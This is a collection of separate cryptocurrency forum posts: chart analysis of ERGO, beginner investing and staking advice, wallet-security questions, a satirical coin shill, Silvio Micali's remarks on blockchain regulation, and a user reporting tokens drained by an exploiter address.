 New analysis on ERGO, it's a coin with a good technology behind it, many miner are using it on lower end GPUs to mine for small profits. So I decided to give more attention to how this coin is behaving now and to try to find it's pressure points for an possible upwards movement.

  
 This coins is heavily mined and this can make the graph to have a different behavior, it seems that the miners are been aggressive and there is someone buying all the offer without forcing the price to move up. Lets see the graph:

[the price has found a massive Support, players are acting on it hard, been tested 4 times before.](https://preview.redd.it/uomhx2ct3tx71.png?width=1879&amp;format=png&amp;auto=webp&amp;s=6b4e2c8efca39f69ae828f8c3569a6d4dc9472ec)

We can analyse this graph and see that the price is trading in a range, it's locked between $8.5 and $11.5. this region is good for trading since there is as region of 25% for the price to bound up and down. Now we can analyse the price movement, there is a strong bearish sentiment on the  Volume, however those are the miners, the big players seem to be buying the maximum of this coin when it hits the lower price of $8.5

The price has been tested 4 times at $8.5, and is now possible it can engage in a new bullish movement. Most of liquidity now is going to bigger coins like BTC and ETH, when they start their correction the cash will flow to smaller coins like this one.

There is basically no support past $11.5 region, the aggression we can see on the left of the map in blue is to show where there was more negotiations for price. The lack of negotiations may make the price go up or lower fast. The only smaller resistance in the path to the top now is around $13.5.

If you believe in this coin, it is starting to give signals of a possible change in tendency, the resistance is acting strong, and now with low volume, any player can easily move this coin to it's all time high.

If one is looking for Support and Resistances this is the Graph:  


[We have pressure points at $8.5, $11.5, $13.5, $16 and $18](https://preview.redd.it/vfpnwzds6tx71.png?width=2025&amp;format=png&amp;auto=webp&amp;s=a523bebe18c1eb00ead82a1c3cb415b45ed92381)

The players are fighting heavy on the bottom, miners are vending their coins and now big players are acquiring all the coins they can. Now that the price and touched the pressure point again it could be a nice movement to enter upwards and do some trading.

  
Be careful the prices here show where the coin could feel strong price action. EMAs are starting to press the price against the support, once the price is above the heavy EMA I think that bots would drive the movement upwards again. The key of this move for me is the EMAs, they are used by bots and you can see that when they are touched there is aggression, if the price stays above it, the movement could go upwards fast. Bots are buying this coin while they can keep it's value low.

What do you think about this coin? Do u believe in these support and resistance for pressure points? Do you also believe that the bots are creating pressure points on the EMAs?   
Tell me more about it! any coin your recommend for analysis?!

Hi all, thanks for this community. I joined it last year and didn't pay attention (major regrets) but have been active in the last 3 months. I have a couple of questions if someone can help please. 

1) I saw ETH go up and down in the last month and like an ass sold all my investment at a perceived ATH a week ago :( I have since seen it go up and up. 
I 100% believe in this coin and was supposed to hold for a few years but paper hands :( 
Shall I wait to buy back, slowly reinvest or just go all in? I will obviously have to pay tax as well.. I can't believe what an idiot I am 

2) Between various wallets and exchanges, how do you ensure security? What if I lose my phone or can't find that piece of paper I had written seed phrases on  I am being paranoid but need to do something quickly to ensure I can restore my accounts if and when needed. 
How do you do it? 

Fyi, no need to DM me, I am not answering DMs or clicking on any links thanks

Its apparently owned by Mark Zuckerberg, The Rock, and Obama. Im not sure on the details because theres really not much information on it and no one is talking about it, but it is supposed to be able to teleport people through the blockchain like in Star Trek without any gas fees

I read the white paper and I really believe in the tech. Im hearing theyve also got some really neat time travel projects on the go. Not to mention every Facebook user will get a free Loopring bandana or keychain (while supplies last)

The market cap is only $10,000 right now and the dev team is fully doxed. Theyre also the same people who created the original Palm Pilot and were instrumental  in the development of the new Root Beer flavour of Pop Tarts. Im not kidding when I say I think it could 1000x time easily by the end of December. 

Of course, as with anything, DYOR. But Im shocked not a single person is talking about this revolutionary coin.

Let's talk about some of us who don't have so big incomes but are still interested and want to join cryptocurrency investing. Many people will tell you to go the safe way, bonds, saving accounts, even stocks. As a single dad who at the end of the month doesn't have much financial means to invest in such, that simply doesn't work.  Entry price to real estate is simply unimaginable to me, stocks are expensive usually and offer low returns with small investments, bonds are a no-go for a guy like me. Does crypto work? It can work awesome if you don't do stupid decisions. But it will depend a lot on when you enter, how you enter, how you put your money in and in what you put your money in. If you are still with me, let's see how we, as poor investors can start building up our future in crypto.

&amp;#x200B;

**Best way to dip your toes in?** 

Probably you are wondering how to start? I wholeheartedly recommend that you make a Coinbase account, do KYC and do the lessons in their EARN section. That will net you about thirty bucks right off the bat and these lessons keep coming every few weeks so it's an amazing opportunity for those who are low on money and still want to start. 

&amp;#x200B;

**Which crypto do you recommend?** 

I advise you to start researching what crypto to invest into. Remember that small coins are much riskier than bigger brothers such as BTC and ETH. That is especially true when dips or bear market happens. Small coins prices swing wildly while bigger coins are more stableish. And please, try to avoid memecoins. They are fun and can offer insane returns, but as a poor investor, I stay away from them.  To put it simple  

* **Big coin** \- safer, less returns, better stability and less swings
* **Small coin** \- much more of a gamble, unstable, extreme swings, can have amazing ROI

&amp;#x200B;

**Should I put my money right in?** 

When you are ready to invest do not put all your money that you have aside into it. Putting your money on dollar cost average basis is a far more secure way of doing it, even in bullish market as we have now. Don't let your hype and emotions overcome you. How much do I put in? Normally I can manage about 10-20$ a month. We cook all our food apart from pizza nights with kids sometimes and I stopped smoking which is a big help. I drink about 2 beers a month in the evening if Im mentally exhausted. Helps me to relax a bit. On good months I can manage 30$ and that's my limit. And you know what? It's more than enough! Don't think you are too small just because some people invest thousands or ten thousands in memecoins. You are you. You do the best you can with what you have, thats what its all about. If you can manage 10$ a month that's amazing. Even if you are just reading this you are stil way ahead of others. Many still fear crypto like its some kind of virus.

&amp;#x200B;

**Exchange vs Wallets ?**

There is a lot of talk about *"not your keys not your coin"* here. If you have low amounts of money invested, it's normally pointless to move it to a wallet. Especially when it comes to high transaction fee crypto such as Ether. Eth can have ridiculous fees, as can Bitcoin. If you use a good, well known exchange, you can leave your money there and it will be pretty damn safe. Sometimes it's maybe even safer. Especially for newbies who don't yet understand how wallets work and how to take precautions when storing your crypto. 

&amp;#x200B;

**Don't know which exchange to use?** 

* *Binance* (low fees so maybe one of the better choices for us)
* *KuCoin* (feels like a knockoff of Binance, but its ok and fees are also very low)
* *Coinbase* (try to use Coinbase PRO to lower the fees!)
* *Kraken* (good customer service but high fees)
* *Bitstamp* (good exchange with good security and history but fees are one of the highest)

&amp;#x200B;

**Now that you own crypto what do you do next?**

You don't day trade or do leverage would be my top advice. Chasing pumps is also something that will likely make you lose your money. The best thing to do is to educate yourself more about crypto. Read news, join this sub if you havent, and listen to people babble about it. If nothing else you'll get a ton of hopium. Slowly you'll start to understand more about this new phenomenom that we are witnessing. Crypto opened the doors to us small investors but it's on us to enter. 

&amp;#x200B;

**Can I earn even more just like that?**

Yeah, there are a lot of ways to passively earn crypto. You can use Brave browser to get small amounts of crypto while you browse the net, you can play games like Coinhuntworld (for US and Canada mainly), you can play cryptoroyale for free. It all adds up a lot. And you can post here for some additional dough to put in your portfolio. Once you start you'll see how quickly it amasses to something pretty unbelievable. 

&amp;#x200B;

**Should I stake my crypto?** 

Many exchanges offer staking of both crypto and stablecoins. If you have crypto why not make it work for you? Returns may seem small at first but don't let that discourage you.  Some coins offer more returns than others but I'd always choose safer vs the % on returns. Once you get more into crypto DeFi staking offers best returns. But try to stay away from it at least a few months so that you really understand the space before going deeper. 

  
That's it from my side! 

If you have any kind of questions for me, please don't hesitate to ask! I'd be more than happy  to help a fellow bum out!

Im open to all criticism on this post

I have about 700 in crypto rn. I have been slowly building up my portfolio over the past 3 years getting more aggressive with it last year. 400 of that is in Eth and the other 300 spread out Mainly through BAT and AMP and LTC. 

Anyway to the main question. Does anyone see BTC as a way to save money for the long term? Im talking 10+ years. I am good at saving money and never touching it but the thing that scares me mostly is inflation of the US dollar. Im not going to dump all of my savings int BTC but ive been thinking about slowing putting in around $15-$25 dollars a week (as thats viable with my budget, not taking money away from my standard saving method which is just a savings acct) into it over the course of how ever many years and never touch it until say retirement/ any big purchase in that far future. 

Thanks for reading. If any of this comes of as ignorant i am still sort of new to all of this

Im a bitcoiner true &amp; true, but I also [need money now.](https://m.youtube.com/watch?v=HX0fIi3H-es) Im in a wee bit of debt and my relationship could use more than one date night per month. Im incapable of parting with my bitcoin holdings, which are very, very humble anyway.

Is there anyone of my ilk, whos holding a few or a dozen shitcoins just for EOY gains?

Im literally only capable of investing $50/week MAX and if anyones done enough DD to all but guarantee a nice return on any of the many garbage projects on coinbase *the shit coin casino* if you make a compelling enough case, Im in.

Suggestions welcome, TIA

Hello everyone!

I've been in crypto since 2017 and I leant a lot of things since then.  First of all, I'm living in a kinda third world country and working in crypto currency field for the last 3 years. I worked with some popular exchange platforms and a couple of crypto wallets (I'm pretty sure you've heard about them). 

So, my experience working as a support team manager of a cold wallet app:
1. 80% of the users forget their PIN, don't have a backup for their 2fa and misspell emails when set up an account. If you want to recover access to your account, you need to ALWAYS have a backup or remember a lot of details about your account to gain access once again. Please, be responsible and attentive!
2. Hundreds of users send coins to the wrong addresses every week. Send USDT to LTC wallet address? Easy for our users. Send not supported BEP-20 tokens to ETH wallet address? Even easier. 
3. There might be some issues with the wallet app, there might be some exchange problems that are usually solved within a couple of hours, there might be a maintenance on our side. But 99.99% when something goes wrong, it is users' fault.

I can share some fun, weird and interesting stories if this post hits the front page of our favorite subreddit. Just believe me, I have a lot of them. LIKE A LOT.

*On October 25, 2021, Silvio Micali was invited to speak at the* [*Commissione Nazionale per le Societa e la Borsa event*](https://www.consobg20.it/) *on regulating innovation in the financial system to power a resilient recovery. The event, which was held in conjunction with the G20 Summit in Italy, was focused on alignment between regulation, finance, innovation and sustainability. Below is the transcription of Silvio's remarks to the esteemed attendees.*

## Session II Digital Innovation: Growth, Inclusion and Disruption

### Chair: Paolo Ciocca (CONSOB Commissioner)



**Ciocca: In your view, which concrete steps can we (business, regulators, research) take to move from utopia to reality, possibly in a short timeframe?**

**Micali:** Thank you, Commissioner Ciocca, for this fundamental question. My answer may come as a surprise:

I firmly believe that we ARE way past Utopia. Reality is already HERE. The future is NOW.

But the media (except for the most professional media) are stuck in an old narrative. So, one thing we can and should do immediately is to correct outdated perceptions.

What are the most frequent misconceptions in most of the Media? Well:

1. All blockchains are the same
2. All blockchains are bad for the environment
3. Blockchains are a solution looking for a problem

These statements have one thing in common: they are ALL FALSE.

Then, what is the TRUTH?

TRUTH PART 1: There exist DIFFERENT types of blockchains.

**First-generation blockchains** could NOT simultaneously be secure, scalable and decentralized. This was unfortunate, because each of these three properties is crucial.

**Second-generation** blockchains, however, ARE secure, scalable and decentralized *at the same time*. As so they should be in order to be useful to the world.

TRUTH PART 2: There exist GREEN Blockchains.

True: **first-generation** blockchains, which still operate today, consume as much electricity as a small country. But **second-generation** blockchains consume IN TOTAL the energy equivalent of 10 homes. Ten well-lit homes, perhaps. But only ten homes, nonetheless.

This is important to understand. The idea that blockchain progress necessarily comes at a cost for the environment is just the **dystopia of the uninformed**.

TRUTH PART 3: **Second generation blockchains** offer powerful **solutions to real problems.** 

Sure: **first generation blockchains** could just offer an immutable archive of static *data*. Thus, at best they could only provide digital gold. At worst, only speculation: the false promise of high returns on small investments.

BY CONTRAST, **second-generation blockchains** offer way more than an immutable and transparent database. They also secure all kinds of *transactions*. For instance, they enable two parties to exchange assets *directly. Without having to rely on costly intermediaries.* In a SINGLE, INDIVISIBLE transaction. In just a few seconds. With total security. And at the cost of *a fraction of a cent*.

Such security and such time and cost efficiencies are crucial to small and medium enterprises and wherever economic development is needed. Because *traditional mediators are too costly and do not have the time or the financial incentives to enroll ordinary people and help them in their ordinary transactions.*

More wholistically, the truth is that second-generation blockchains are an instrument of *real* progress.

For the first time in Finance, bilateral exchanges can be truly simultaneous, secure, and *unmediated*. Mediators that add value to the transaction will always be welcome, but when the only function of a mediator is to enable the transaction itself, then what is welcome is a secure and efficient technology that replaces that mediator!

To be sure, some countries are lucky enough to have already in place payment systems that are electronic and extremely fast. Yet such payments are still *unilateral*. Even when they are used to purchase digital good and services, *expensive* and *slow* architectures must be relied upon to guarantee that you will get what you are paying for. *Payment vs. Delivery* continues to be a major problem. Also when payments are super-fast. Only second-generation blockchains have finally solved this vexing and century-old problem. But not only that.

Second-generation blockchains provide a sustainable, incorruptible platform on which air and water quality can be monitored by a multitude of independent actors, and thus with no cheating.

They provide a platform that is so efficient and so decentralized to really achieve financial inclusion.

They provide a technology enabling the Public Administration to become that *transparent house,* quella *casa di vetro*, which is the very goal of our esteemed host today: il *Consiglio di Stato.*

All of this is possible TODAY, not in some mythical future. Cost, performance, and sustainability are no longer barriers to mass adoption. We must correct outdated narratives. And all of us, businesses, regulators, and researchers, must seek and be open to new information that is aligned with current reality**.**

**Ciocca: Lets now move to scam artists and sharks. We know that there is no free lunch here too, so innovation opportunities do come with challenges and risks. In your experience, which are the main current and prospective obstacles to a speedy deployment of inclusive financial innovation on a global scale? How can regulation, international and business cooperation support in addressing these hurdles?**

**Micali:** I very much thank you Commissioner Ciocca for this question too. It is indeed urgent for regulators to intervene in blockchain matters*and*to do so *correctly*.To begin with, we must acknowledge that this is *not* an easy task. Correctly regulating the blockchain requires grappling with two major issues.

FIRST ISSUE: *Some blockchains out there* ***are*** ***bad***. They promise financial inclusion, but they either fail to deliver on their promise or, worse, harm those who trusted them. This is a problem, because b*ad blockchains cannot be punished.* Whereas the crypto wallets of individual criminals can be traced through forensic work, as platforms, bad blockchains do *not* have a physical address. Do *not* have a phone number. They are everywhere and nowhere. There are no offices to seal shut. The platforms themselves cannot be shut down. If bad blockchains were to dominate the market of digital ledger technology, *it would be a collective nightmare*.

SECOND ISSUE: *Blockchain technology is already EXTREMELY popular and is here to stay.* The demand for this technology, in so many domains, cannot be suppressed. In the world there is a natural demand for transactions that do not need costly intermediation. For inclusive finance. For speedy, reliable, and transparent administration. With this kind of demand, the blockchain cannot be ruled out of existence.Nature abhors a vacuum. And in the absence of correct regulation, the risk is that *bad blockchains* will rush in to fill this vacuum and provide ineffective or harmful solutions to the ever-greater demand for this powerful technology

*Then, how to act?*

Because punishing bad blockchains is impossible and because the appeal of blockchain technology is irresistible, let me suggest that what the regulators should and can do is to allow *good* *blockchain projects* to fulfill the worlds demand. And to do so *as quickly as possible*. With regulatory uncertainty, good blockchain projects will, by and large, refrain from entering the arena, and with outdated regulation, good blockchains will compete at a disadvantage with bad blockchains that simply ignore all rules. So the danger is that this crucial and needed space will be filled by *bad blockchains,* which cannot be dislodged.

So: Can we distinguish which blockchains are good and which are bad? Which foster financial inclusion, and which do not? I think we can. Let me suggest four *simple* tests that go a long way in this direction. 

FIRST TEST: *Scalability.* Financial inclusion, by definition, needs scalability. So, a simple but very useful question is: *How many transactions per second are possible in this blockchain?* If the answer is, say, 16 TPS, then there CANNOT be any financial inclusion. There are billions of us and with this transaction rate you are lucky if you transact once a year. Such a blockchain can only support speculation and does NOT pass this test!

SECOND TEST: *The Cost of Basic Smart Contracts.* The quintessential basic smart contract is a *bilateral exchange*: I have an asset that you want and you have another asset (e.g., money) that I want, and we wish to swap them. Thus, *What is the cost of a bilateral exchange of assets in this blockchain?* If the answer is *50 cents or more*, then this blockchain cannot deliver financial inclusion! Because exchanging assets is the most fundamental form of trade indeed the heart of commerce itselfand because 50 cents are an *exorbitant* amount when your salary is $50/month, or when the assets to be exchanged are worth $10.

THIRD TEST: *Environmental Sustainability.* Blockchains, like any other product, require energy to be produced and energy to operate. So, *how much power does this blockchain consume?* If the answer is *a LOT of energy*, then there is no hope for financial inclusion. And worse. Because the less privileged are the first to suffer from the degradation of the environment. A blockchain that is **bad** for the environment is a **bad** blockchain. Period.

FOURTH TEST: *Consensus.* Consensus is the fundamental process by which new blocks of transactions are chosen and added to the chain. So, lets ask: *Can anyone participate in the consensus protocol of this blockchain?* If the answer is: *sure, as long as they buy a couple of supercomputers* then there cannot be any financial inclusion either. Because most of us cannot afford buying super computers. If the answer is *Sorry: we already have a club of, say, 10, 20, or 100 agents who are in charge of choosing future blocks on behalf of all of us,* then, again, no financial inclusion. In fact, such an elitist club has the full power to *exclude* whomever they want from transacting.

FIFTH TEST: *Continuity of Service*. Lets put it simply: *How often is this blockchain down?* If the answer is for a few hours every month, then the chain is inappropriate for financial inclusion. Truly decentralized services do not frequently stop working. Speculation can easily skip a day, but essential financial services must operate without interruption.

SIXTH TEST: *Upgradability*. Can this blockchain be upgraded? Has it ever been updated? If the answer is No, never, we are proud that the chain will continue to operate in the same way it has always operated, then, walk away. When new and safe technology becomes available, a blockchain must be able to incorporate it seamlessly, without interruption of service and in an automatic, decentralized manner. Only so can a blockchain continue to satisfy the needs of its community, today and tomorrow.

SEVENTH TEST: *Decentralized Interoperability*. We should never trust any blockchain, or any infrastructure for that matter, which would not allow us, when necessary, to transfer our assets and our information elsewhere. So: *Can this blockchain easily transfer assets and information to another blockchain? Can it do so in a decentralized fashion?* Unfortunately, most approaches to blockchain interoperability today are centralized, nave, and dangerous. They envisage a few trustees who would tell with absolutely authority, and hopefully with absolutely honesty, what is transferred from one blockchain to another. Introducing such centralization is very dangerous, because corrupting or hacking a few trustees is very easy. Moreover, imposing a proportionate fine upon a trustee who, maliciously or not, has made a mistake would be an *empty threat*. The value transacted across blockchains would be enormous, and no trustee would have the ability to pay fines commensurate to the damage done. Decentralization is the real source of security. Interoperability between two blockchains should be achieved directly by the two blockchains involved, without the intervention of anyone else. It is only a question of technology, and such technology is already mature. Lets not settle for anything less.

In conclusion: *What specific steps should regulators, in particular, and more generally governments, businesses, technologists, and citizens at large, take?* In my opinion, two steps: *education* and *experimentation*.

**STEP 1:** EDUCATION, because we should understand and clarify to the general public which *technical* *properties* blockchains should have in order to be truly useful to civil society. This step goes a long way towards preventing that individuals, businesses, institutions, and governments, honestly intending to participate in Decentralized Finance, Transparent Administration, etc., find themselves stuck in an inferior blockchain whose technology can only deliver centralization, if not risky speculation.

**STEP 2:** EXPERIMENTATION, hopefully through sandboxes. Because sandboxes are essential to allow the regulator to understand first-hand not only the potential, but also the limits of blockchain technology. Sandboxes are essential for enabling the regulator to keep pace with a new technology that keeps evolving at super speed. *The blockchain cannot be regulated with just the rules of the last two decades, let alone those of the last century.*

Only through education and experimentation can we achieve **CORRECT** REGULATION. Permitting responsible blockchain technologies to help all of us move forward in a safe way. And fostering that *financial inclusion* and that *international collaboration* that are at the very heart of the G20s mission.

Hi! I'm using wowswap to trade leveraged crypto, but I saw someone commented in another thread that trading crypto on margin is illegal in the US? I never had to use a VPN to get there, but I also own the DAO so could I be liable if wowswap got taken down? Idk it's probably not a big deal because I'm not making a noticeable amount on there. And what would the "punishment" even be? I doubt anyone cares about this other than taking down exchanges or making me pay extra taxes.  


Also, that's such a dumb law, isn't it? Why would they make that illegal?

If you guessed either, well you're wrong...unrealised gains on both are almost exactly the same. (8% plays 200% in the percentage gains though!)

I know, slightly underwhelming, but the underlying point in the post is that as a relative beginner, it's incredible the returns crypto investments can provide. Yes, I appreciate the opposite is true and you can lose it all as well, but I ain't got time for negative shit like that in my life.

I'm UK based, so I had a 1.1% Cash ISA pre-pandemic, and only started looking elsewhere once those rates dropped to 0.1%. Unfortunately, I will always have found crypto late, but very happy to be here now. Not sure what standard returns you can get elsewhere in the US/Europe.

Anyway, what I really wanted to know is, from others relatively new to the crypto space, what sort of returns were you seeing from 'standard' investment tools, and how quickly did you get to experience the wonderful volatility (in either direction) of crypto?

Here's a link to the ticker DOGEUSDSHORTS on TradingView 

https://www.tradingview.com/chart/?symbol=BITFINEX%3ADOGEUSDSHORTS

As you can see, DOGE Short Interest is at record levels. That ticker just tracks BITFINEX data and not all of the data from all of the exchanges. BITFINEX data roughly mirrors what's happening overall and like to use it to spot trends on the derivatives market for cryptos because of how dramatically they control price action of the coin.

Here's a link to DOGE on Coinglass.com which aggregates the derivatives data from more places.

We all know that timing the market is just about impossible. 

But what are the signs *you* are looking for that would make you say that the bull market is over... Or more specifically is about to be over?

Just about every youtube "expert" claim that they know when the bear market is about to happen, but really, all they are doing is push their own agenda so they can milk the system.

And, of course, once the market has crashed +50% it is easy to say it is a bear market.

So I am asking you, I am curious to hear what you look for... before the bear market, that would make you say that the bear market is upon us...

ALGO (Algorand)
ONE (Harmony)
LUNA (Terra)
LINK (Chainlink)
MATIC (Polygon)
ADA (Cardano)
SOL (Solana)

I want to be able to keep up with the news on the cryptos that I hold, but I only have time to read news for about 15 minutes a day. So I would like to trim a few from my list. I will cut at least one of the above holdings, maybe two.

I also hold BTC and ETH, but I'm not interested in trimming those.

Also, would you recommend that I re-distribute the proceeds among the survivors? Or choose one or two of them to focus on?

I don't get why everyone's so excited about a chain that has a year out to shipping a solution to such major scalability factors (Ethereum website says it's expected at 2022; I'd wager it's in the latter half of that as well). There's already a number of chains which have better scalability without the excessive gas fees.

Off the top of my head, if you care about decentralization and verifiable security, your choices are between Cardano, Ergo, Tezos, and maybe Algorand (which prioritizes security, but not necessarily formal methods and verifiability). If you just care about smart contracts, NFTs and transaction costs (the surface level problems, I'd say), then you can go for Solana or something.

Personally, I think ETH is overhyped for what it is; I have my position out of the above, and I'm sure others do too, but I don't understand why everyone still HODLs ETH.

# Introduction

First post since lurking on this subreddit for about 2-3 months now, thought I would share some things to look out for when investing money into smaller cap alt coins.

The usual disclaimer follows **'DYOR and this isn't financial advice'**

Top mentions in shilled coins that I ended up buying due to this sub reddit (when I first discovered this subreddit) are **Algo** and **ONE**, also learnt some valuable things like not panic selling and taking profits when I hit a certain milestone, mistake learnt through my own fault was buying fantom when it was pumping, luckily it 2x'd, but still lesson learnt, basically never fomo

Also did try dipping my foot into the market in January 2021 when ETH was under 1k etc. paper hands caused the gap between January and 2 months ago

This post will mainly be split into 4 different sections

The main idea behind this post is to find coins before they go mainstream or reach top 100 ranking/get listed on major exchanges like binance or coinbase

# Phase 1 (initial investigation on coins)

You may want to use coinmarket cap or coingecko to create watchlists to make this easier

* **Name** \- you want to make sure the name is something that investors would actually invest in, not some meme or shitcoin like \*\*\* rocket lol
* **Logo** \- same principle pretty much applies to logo, something that is not going to put a investor off or screams rugpull
* **price** \- not something silly like $0.00000001
* **market cap** \- here we are looking for anything around the $50 million market cap range, tend to be coins ranked between 200-400 in coin ranking, here you will find some good projects with a good amount of growth
* **volume** \- make sure its something that a lot of people are trading, the last thing you want is buying a dead coin with low trade volume
* **circulating supply** \- this is very important, go for something sensible, for example you don't want something that is $0.0001 with 1 trillion supply, more supply = less demand

# Phase 2 (initial research on the actual coins that passed phase 1)

* **website** \- from here you can usually sense a red flag straight away, you want to make sure everything is working (links etc.) the presentation, information, the team behind the coin etc. this is usually a good indicator to see if something is legit
* **telegram** \- some teams actually have a link to their telegram, which is another good indicator to see how serious a coin is and how active the devs/community are, you want to try and find something with decent numbers and dev activity
* **twitter** \- check how regularly they post updates, number of followers, engagement etc.
* **medium** \- another platform for seeing blog posts
* **launch date and price** \- look at the initial price of the coin before the sell off, how its been holding up and if the entry price is feasible
* **FUD/Research/youtube** \- search in this reddit and subreddits in case anything bad has been said about the coin, youtube videos etc.

# Phase 3 (you guessed it, if all the previous criteria has passed)

* **team** \- research who is behind the team, you can normally see this on the about page of the website, twitter, bonus if they have linked in profiles so you know its legit
* **investors** \- this is one of my favorite indicators because there are some big names out there that don't invest in pump and dump schemes, you can usually get this info on their website or through messari.io , some big names are binance labs, coinbase ventures, alameda research, hashed, this will need more research, but you're in for a treat if you have more than 1 big name, the good thing here is, in a bear market when coins go bust, these will have funding from big backers to survive a bear market, also another bonus is if binance labs or coinbase ventures are invested and its not already on their exchange yet the price will boost, so always a nice bonus
* **road map** \- you can usually find this on their website if they have one, bonus if they include dates
* **upcoming events research** \- also always good to know
* **whitepaper/litepaper -**  at least read it even if its skim reading, you can find unique selling points and actually learn what the crypto is about

# Phase 4 (final things)

\- DCA

\- Dip buying :)

\- patience

# extra tips

**current profit taking strategy**

Every time a coin reaches 40% profit I take out 20% of whats in my bag, 80% take 20%, 120% take 20%, rinse and repeat, removes your initial investment loss after 2/3 times and no fear of missing out on profit or losses

**tools**

coinmarket cap, [messari](https://messari.io) io, lunar crush, this sub reddit, other coins sub reddits

Found this twitter a while back, actually tells you what is in coinbase and binance ventures, shows listing reviews, custody etc. you will need to scroll down to find these posts, so good change these will get listed on their exchange eventually which always causes a nice price boost

**coinko twitter \^**

I'm in the long game for BTC and ETH. I'm also a compulsive gambler and have a lot of problems punting off large amounts of coin to online casinos since they make it so unbelievably easy to do so with BTC deposits.

I'm looking for good ways to keep my stash locked up in ways that make it more difficult to access but still fully under my control (I'm not comfortable giving my hardware wallet to someone else to hold for me). ETH staking is great since I can't touch it for a long time and I've done that with a good chunk of my holdings so far.

What are some good options for Bitcoin? Platforms like Celsius/Blockfi seem desirable since withdrawals take a lot longer to process, but I'm curious if there are any other good options out there.

Crypto is a long term investment for me and anything I put into it I won't need to access for any normal expenses for at least 5 years, probably more. Any ideas are greatly appreciated.

Sorry if this has been posted before. I just saw a post like this on a gaming subreddit.

It looks fun to do. So I'll give it a shot!!!

You will ask me a question, then I'll answer, and then you will edit your question to make me look bad. The title is self-explanatory lol, but I need 700 words.

Also HUGE NEWS!!! 

# New York Mayor-elect Adams says he will take his first three paychecks in bitcoin

New York Mayor-elect Eric Adams said on Thursday he would take his first three paychecks in bitcoin and signaled his intention to make his city the "center of the cryptocurrency industry" after he takes office in  January. Also, Adams will become the second Black mayor of NY.

Efforts to transform New York into a crypto hub may draw scrutiny from  New York Attorney General Letitia James, who recently launched a  crackdown on unregistered cryptocurrency companies. Last week James announced her candidacy for New York governor.

So I am pretty much a noob, who only recently got into crypto. I have heard a lot about staking and passive income. So I would like to know, what are the best platforms to use for staking? Which one would you guys recommend? 

I prefer something easy to use and easy to understand, since again I am a noob. 

I really dont want to miss out on any extra dollar I can earn while holding my crypto. 

I trust this community to help me with this matter, since you guys are fucking awesome and actually have got a clue 

Thanks a lot in advance and I am curious to find out about your favorite staking platforms!!

Im amazed at how much weve complained about taxes in the last two days. Then we collectively told ourselves we should complain about the complaints. 

My goodness get a grip folks. 

Dont want to risk penalties and interest on your next 7 tax returns: pay your taxes as best you can. 

Dont care and feel like you can handle keeping your crypto out of sight from the tax man: keep talking about that boating accident where all your intangible investments burned up. 

Lets get back to shilling our favorite coin so people can remind us how those opinions are incorrect too!

Please excuse in advance English is not my native language i did my best :)

Since everyone here talks almost about the same coins: vet,sol,btc,eth,matic etc.

I would like to know some more less known coins that i can research.
If this less known coin has also a low Maximum supply this would be great.
Than again this is not a must have id love to hear everything cosindering it is less known or has potential to go up
Would love to hear your opinions on it and why you bought it. 
All the best and thanks for taking your time to read.

This is my first post here, and Ive been lurking and learning slowly after leaving the crypto space for years. That was a terrible move. I have a question for everyone.

Which projects in the crypto space are you most excited about? One coming up, a recent one, or an oldie? 

I have several Im keeping an eye on, and so far Im only invested in BTC, ETH, XLM, ADA, and some free stuff from Coinbase Ive added to. There are so many platforms and exchanges its hard to know what to focus on at times. 

One that looks intriguing to me is Sundaeswap, but it seems like it is always delayed again.

ETH2 has been in the works for years and we still don't have a release date....Long term ETH Hodler here, what a fun ride it's been. But really, I'm nervous about the upgrade taking so long already while key competitors are making huge strides and stealing attention and devs away...and is the scalability going to actually be enough to handle mainstream adoption? As crypto heads into new territory with grandmas and grandpas taking out reverse mortgages to buy ETH...one has to wonder if a ETH3 will break ground right after ETH2 releases? 

Beyond the FUD, I'm actually really excited to see what devs do when the brakes &amp; gas guzzling aren't a factor anymore. how high can ETH go if the release is soon and ultra successful? 

For the record...I never once believed ETH could overtake BTC, but lately, I've been "never say never" :)

You always hear about people who invested xx amount which turned into xxx amount after a couple of years, so I'm thinking of doing an experiment.

I'm thinking of chucking a couple of hundred - a grand tops - on some alt coins on KuCoin, putting about $25 into each. I will check back in a few years. Maybe it'll be pointless, but maybe - just maybe - a few would've mooned.

Which ones would you invest in if you were doing the same? Any particular reason? You can choose any amount of different coins - just throw them out there - but try to have some substance with your responses.

My first post here and I hope this does not break any rules. 

A few hours ago I opened my Metamask wallet and saw all my BSC tokens sent to a wallet labeled "[bZx PrivKey Exploiter](https://bscscan.com/address/0x74487eed1e67f4787e8c0570e8d5d168a05254d4)"

Looking into the [transaction](https://bscscan.com/tx/0xdd2393d019cc70762cf18692f5e55ce8d4f44cffeea4418bd9ad35fd6426a4b1), it seems that a [smart contract](https://bscscan.com/address/0x97ebf27d40d306ad00bb2922e02c58264b295a95) did the job and many other people are suffering the same thing at this moment. 

Any ideas how this might have happened?

Coinbase has been goofing up for me a lot lately. Both the regular Coinbase and Coinbase Pro ( pc and app) are not working for me for the last hour or so. Does anyone else have this same issue? Sucks cuz I got paid today and want to lose it all in crypto again.    Coinbase has been somewhat flakey which is discouraging because its supposed to be the best. Oh well, thats the crypto market I suppose, cant expect everything to work 100% of the time. I wonder when it will be back up and running? I wonder when I will hit the character limit to post on here? I  wonder if it will be a hard winter this year, or will it be mild again? I hope it snows a ton, I miss the old school winters.

November has already started showing how explosive it will be for Secret  Network mainnet and its ecosystem. Yes, if you dont know the secret,  Im talking about the first and still the only  privacy-preserving  decentralized smart-contract platform in the history of blockchain  technology.  Im so thrilled to talk about so many developments that happened and are  happening around the project that Ive lost track of where to start. Towards the end of Uptober, Ive felt the sensational battle of owning  Anons NFT across not only the Secret Network community but the whole NFT  community. I still can not believe that all the 580 unique anons were  minted within a short period of time. This tells you how scarce,  demanding and valuable Secret NFTs would be. 

